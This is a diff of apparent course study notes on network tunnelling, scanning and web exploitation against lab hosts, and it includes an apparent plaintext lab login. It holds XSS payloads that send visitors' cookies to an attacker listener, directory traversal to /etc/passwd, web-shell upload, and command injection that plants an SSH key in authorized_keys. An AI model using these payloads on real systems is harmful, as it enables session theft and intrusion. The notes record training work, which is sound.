@@ -1,4 +1,6 @@
 # TAKE GOOD NOTES 
+
+# write down all tunnels. Just copy and paste after done with it
 # Stack
 6
 Jump:
@@ -14,9 +16,11 @@ Username:
 DODU-005-M
 ZgoxLDNLHlzqU1a	
 ## Set up control socket (to jump box. exchange the ip and /tmp/* to where your going)
+```
  ssh -MS          /tmp/jump             student@10.50.40.153
       ^               ^                           ^
 Master socket   Directory + name         Normal login with ssh
+```
 
 ssh -MS /tmp/jump student@10.50.40.153
 ## Ping sweep
@@ -29,9 +33,11 @@ Windows
 for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
 ```
 ## Dynamic port forward 
+```
 ssh -S /tmp/jump jump            -O forward -D9050 
      ^             ^                ^
   No loggin   Device name      Dynamic forward
+```
 ssh -S /tmp/jump jump -O forward -D9050
 ## proxychains nmap scan for open ports
 ```
@@ -182,4 +188,164 @@ nmap -p 80 --script=firewalk.nse <IP Address>
   --script-args=firewalk.probe-timeout=400ms <IP Address>
   --script-args=firewalk.firewalk.max-probed-ports=7 <IP Address>
 This entry shows examples of utilizing the --script-args option, identifying a valid value from within the script in order to narrow the scan.
+```
+# Web Exploitation (Day 1 XSS)
+
+Server/Client Relationship
+```
+Synchronous communications between user and services
+Not all data is not returned, client only receives what is allowed
+```
+# HTTP Response Codes
+```
+10X == Informational
+2XX == Success
+30X == Redirection
+4XX == Client Error
+5XX == Server Error
+```
+# wget (not recommended)
+```
+wget -r -l2 -P /tmp ftp://ftpserver/
+wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
+wget --load-cookies cookies.txt -p https://website/interesting/article.php
+```
+# GET request
+```
+https://www.columbiacountyga.gov/Home/Components/JobPosts/Job/1/1
+/something.php?var=hi (the ? will allow us to send info to the webserver)\
+```
+# cURL(not recommended)
+```
+Not recursive
+Can use pipes
+Upload ability
+Supports more protocols vs Wget, such as SCP & POP3
+curl -o stuff.html https://web.site/stuff.html
+curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
+```
+JavaScript (JS)
+```
+Allows websites to interact with the client
+
+JavaScript runs on the client’s machine
+
+Coded as .js files, or in-line of HTML
+```
+# JS Interaction
+```
+<script>
+function myFunction() {
+    document.getElementById("demo").innerHTML = "Paragraph changed.";
+}
+</script>
+<script src="https://www.w3schools.com/js/myScript1.js"></script>
+```
+Web Developer then call function by finction_name()
+# Enumeration
+```
+Robots.txt
+Legitimate surfing
+Tools:
+ NSE scripts
+ Nikto
+ Burp suite (outside class)
+```
+# Cross-Site Scripting (XSS) Overview
+```
+Insertion of arbitrary code into a webpage, that executes in the browser of visitors
+Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
+Often found in forums that allow HTML
+```
+# Reflected XSS
+```
+Most common form of XSS
+Transient, occurs in error messages or search results
+Delivered through intermediate media, such as a link in an email
+Characters that are normally illegal in URLs can be Base64 encoded
+```
+# Stored XSS
+```
+Resides on vulnerable site
+Only requires user to visit page
+<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
+```
+# Useful JavaScript Components
+```
+Proof of concept (simple alert):
+<script>alert('XSS');</script>
+
+Capturing Cookies
+ document.cookie
+
+Capturing Keystrokes
+ bind keydown and keyup
+
+Capturing Sensitive Data
+ document.body.innerHTML
+```
+# command to compromise web page (in a chat bar or something of the sort)
+```
+python3 -m http.server
+<script/>document.location="http://10.50.27.207:8000/"+documnet.cookie;</script>
+```
+# Server-Side injection
+```
+  Directory Traversal/Path Traversal
+Ability to read/execute outside web server’s directory
+Uses ../../ (relative paths) in manipulating a server-side file path
+
+view_image.php?file=../../etc/passwd
+```
+# fle locations for linux
+```
+/etc/passwd + /etc/hosts
+```
+# Malicious File Upload
+```
+  Site allows unsanitized file uploads
+
+Server doesn’t validate extension or size
+Allows for code execution (shell)
+Once uploaded
+ Find your file
+ Call your file
+place to upload, call file, location where its uploaded to
+```
+run image.png.php
+# on the website commands from the script
+whoami
+pwd
+# Command injection
+; [command line] will overwrite there script they have
+/var/www/html for home directory of apache
+
+# uploading ssh key
+; mkdir [home directory]/.ssh (on webpage)
+ls -la ../../.ssh/ [on box]
+ssh-keygen -t rsa -b 4096 [on box to generate new ssh keys with no passphrases]
+cat ls -la ../../.ssh/id_rsa.pub (copy the entire file)
+; echo "(what you copied from ssh)" > [home directory]/.ssh/authorized_keys (on webpage)
+;cat [home directory]/.ssh/authorized_keys (make sure it works)
+ssh -i ~/.ssh/id_rsa [user]@[ip] (on host)
+
+
+# How to get cookies from a message box
+```
+on lin-ops:
+cd /home
+python3 -m http.server
+
+on website:
+<script>document.location="http://10.50.27.207/Cookie_Stealer1.php?username=" + document.cookie;</script>
+```
+# How to traverse directories on websites
+```
+if it looks like the path below, make sure to put the commands in the books= portion to traverse through
+http://127.0.0.1:5432/books_pick.php?book=web
+example http://127.0.0.1:5432/books_pick.php?book=../../../../etc/passwd
+```
+# going to other peoples directories
+```
+after log in just cd ../ to see other users available
 ```
